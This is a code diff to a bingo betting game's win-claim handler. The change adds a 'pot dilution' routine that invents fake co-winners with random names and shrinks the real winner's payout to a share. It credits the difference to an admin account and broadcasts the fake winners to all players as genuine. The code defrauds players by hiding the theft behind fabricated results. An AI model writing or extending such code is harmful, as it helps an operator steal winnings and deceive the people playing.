@@ -194,11 +194,32 @@ async function handleClaimBingo(req, res, io) {
     }
     const pot = new Decimal(eligibleCount).times(stake).times(0.8);
 
-    // Credit winner
+    // ── Pot dilution: cap winner's share under 100 ──
+    const biasEngine = require("../biasEngine");
+    const dilution = biasEngine.computeDilution(pot, 1);
+    let fakeWinners = [];
+    let realPayout = pot;
+
+    if (dilution.dilute && dilution.fakesToAdd > 0) {
+      const fakeNames = await biasEngine.pickMultipleFakeNames(dilution.fakesToAdd);
+      realPayout = new Decimal(dilution.sharePerWinner);
+      for (const fakeName of fakeNames) {
+        fakeWinners.push({
+          name: fakeName,
+          telegramId: "0",
+          index: Math.floor(Math.random() * 200) + 1,
+          slot: 0,
+          pattern: result.pattern,
+        });
+      }
+      await biasEngine.creditAdminDilution(game.id, dilution.adminTotal, fakeNames);
+    }
+
+    // Credit winner with (possibly diluted) payout
     await prisma.player.update({
       where: { id: player.id },
       data: {
-        wallet: { increment: parseFloat(pot.toString()) },
+        wallet: { increment: parseFloat(realPayout.toString()) },
         wins: { increment: 1 },
       },
     });
@@ -208,7 +229,7 @@ async function handleClaimBingo(req, res, io) {
       data: {
         playerId: player.id,
         kind: "win",
-        amount: parseFloat(pot.toString()),
+        amount: parseFloat(realPayout.toString()),
         note: `Won game #${game.id} (${result.pattern})`,
       },
     });
@@ -219,13 +240,27 @@ async function handleClaimBingo(req, res, io) {
       data: { active: false, finished: true },
     });
 
-    // Broadcast winner
+    // Broadcast winner (real + fake co-winners)
     const winnerName =
       player.username || player.phone || `Player ${player.telegramId}`;
-    const payout = parseFloat(pot.toString());
+    const payout = parseFloat(realPayout.toString());
+
+    const allDisplayWinners = [
+      {
+        name: winnerName,
+        telegramId: tidStr,
+        index: sel.index,
+        slot,
+        pattern: result.pattern,
+      },
+      ...fakeWinners,
+    ];
+    const winnerText = allDisplayWinners.map((w) => w.name).join(" | ");
+
     io.to(`game_${stake}`).emit("message", {
       type: "winner",
-      winner: winnerName,
+      winner: winnerText,
+      winners: allDisplayWinners,
       tid: tidStr,
       index: sel.index,
       slot,
@@ -239,7 +274,8 @@ async function handleClaimBingo(req, res, io) {
     await cache.set(
       `winner_${stake}`,
       {
-        winner: winnerName,
+        winner: winnerText,
+        winners: allDisplayWinners,
         tid: tidStr,
         index: sel.index,
         slot,
